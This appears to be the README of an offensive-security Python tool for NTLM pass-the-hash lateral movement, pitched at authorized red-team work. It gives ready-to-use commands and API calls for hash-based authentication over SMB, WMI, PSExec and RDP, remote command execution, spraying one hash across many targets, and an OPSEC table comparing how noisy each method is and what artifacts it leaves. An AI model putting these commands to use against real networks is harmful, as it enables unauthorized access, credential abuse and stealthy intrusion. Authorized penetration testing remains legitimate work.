# Pass-the-Hash Lateral Movement Framework

A professional, modular Python framework for NTLM Pass-the-Hash attacks during authorized penetration testing and red team operations.

> ⚠️ **LEGAL DISCLAIMER**: This tool is intended for authorized security testing only. Unauthorized access to computer systems is illegal. Always obtain written permission before testing.

## Features

- **Multiple Authentication Methods**: SMB, WMI, PSExec, and RDP
- **Hash Spraying**: Test credentials across multiple targets
- **Credential Testing**: Test multiple credentials against single target
- **Professional Reporting**: JSON reports with detailed results
- **Modular Architecture**: Easy to extend with new methods
- **Type-Safe**: Full type hints and dataclasses

## Installation

```bash
# Clone the repository
git clone https://github.com/maxwellcross/pth-framework.git
cd pth-framework

# Install dependencies
pip install -r requirements.txt
```

### Dependencies

- Python 3.8+
- CrackMapExec (for SMB method)
- Impacket (for WMI/PSExec methods)
- xfreerdp (for RDP method)

## Quick Start

### Command Line

```bash
# Single target SMB authentication
python -m pth_framework --target 192.168.1.100 --username admin --hash aad3b435b51404eeaad3b435b51404ee --method smb

# WMI with command execution
python -m pth_framework --target 192.168.1.100 --username admin --hash aad3b435... --method wmi --command "whoami /all"

# Spray hash across network
python -m pth_framework --username admin --hash aad3b435... --spray targets.txt --method smb

# RDP Pass-the-Hash (requires Restricted Admin)
python -m pth_framework --target 192.168.1.100 --username admin --hash aad3b435... --method rdp
```

### Python API

```python
from pth_framework import PassTheHashFramework, Credential

# Initialize framework
framework = PassTheHashFramework()

# Create credential
credential = Credential(
    username="admin",
    ntlm_hash="aad3b435b51404eeaad3b435b51404ee",
    domain="CORP"
)

# Single target authentication
result = framework.authenticate(
    target="192.168.1.100",
    credential=credential,
    method="smb",
    command="whoami"
)

# Spray across multiple targets
results = framework.spray_hash(
    targets=["192.168.1.100", "192.168.1.101", "192.168.1.102"],
    credential=credential,
    method="smb"
)

# Generate report
framework.generate_report()
```

## Authentication Methods

### SMB (CrackMapExec)

The most versatile method. Uses CrackMapExec for authentication.

```bash
python -m pth_framework -t 192.168.1.100 -u admin -H hash --method smb
```

**Indicators:**
- `Pwn3d!` = Admin access achieved
- Standard output = User-level access

### WMI (Impacket)

Uses Impacket's `wmiexec` for command execution via WMI.

```bash
python -m pth_framework -t 192.168.1.100 -u admin -H hash --method wmi --command "ipconfig"
```

**Advantages:**
- No service installation
- Uses legitimate management interface

### PSExec (Impacket)

Classic lateral movement via service installation.

```bash
python -m pth_framework -t 192.168.1.100 -u admin -H hash --method psexec --command "whoami"
```

**OPSEC Warning:** Creates service on target, leaves artifacts.

### RDP (xfreerdp)

Pass-the-Hash via RDP Restricted Admin mode.

```bash
python -m pth_framework -t 192.168.1.100 -u admin -H hash --method rdp
```

**Requirement:** Restricted Admin must be enabled on target.

## Project Structure

```
pth_framework/
├── __init__.py          # Package exports and version
├── __main__.py          # CLI entry point
├── core/
│   ├── __init__.py
│   ├── models.py        # Dataclasses and enums
│   └── framework.py     # Main orchestrator
├── methods/
│   ├── __init__.py      # Method factory
│   ├── base.py          # Abstract base class
│   ├── smb.py           # CrackMapExec method
│   ├── wmi.py           # Impacket WMI method
│   ├── psexec.py        # Impacket PSExec method
│   └── rdp.py           # xfreerdp method
├── reports/
│   ├── __init__.py
│   └── generator.py     # Report generation
└── utils/
    ├── __init__.py
    ├── output.py        # Console output handling
    ├── executor.py      # Command execution
    └── files.py         # File utilities
```

## Input File Formats

### Target List (targets.txt)

```
192.168.1.100
192.168.1.101
dc01.corp.local
```

### Credentials JSON (credentials.json)

```json
[
    {"username": "admin", "ntlm_hash": "aad3b435...", "domain": "CORP"},
    {"username": "svc_backup", "ntlm_hash": "31d6cfe0...", "domain": "CORP"}
]
```

## Output

Reports are saved to `pth_results/` by default:

```json
{
    "timestamp": "2025-01-20T12:00:00",
    "summary": {
        "successful": 3,
        "failed": 2,
        "admin_access": 2
    },
    "successful": [...],
    "failed": [...]
}
```

## Extending the Framework

### Adding New Authentication Method

1. Create new file in `methods/`:

```python
from .base import BaseAuthMethod
from ..core.models import AuthMethod, AccessLevel, Credential

class NewAuthMethod(BaseAuthMethod):
    method = AuthMethod.NEW_METHOD
    
    def build_command(self, target, credential, command=None):
        return f"newtool {target} -u {credential.username}"
    
    def parse_output(self, output_text):
        if 'success' in output_text:
            return True, AccessLevel.ADMIN, None
        return False, AccessLevel.NONE, "Failed"
```

2. Register in `methods/__init__.py`:

```python
METHOD_REGISTRY['newmethod'] = NewAuthMethod
```

## OPSEC Considerations

| Method | Noise Level | Artifacts |
|--------|-------------|-----------|
| SMB    | Low         | Event logs |
| WMI    | Medium      | WMI logs |
| PSExec | High        | Service creation |
| RDP    | Medium      | RDP logs |

## Author

**Maxwell Cross** - Red Team Operator & Security Researcher

## License

For authorized security testing only. See LICENSE for details.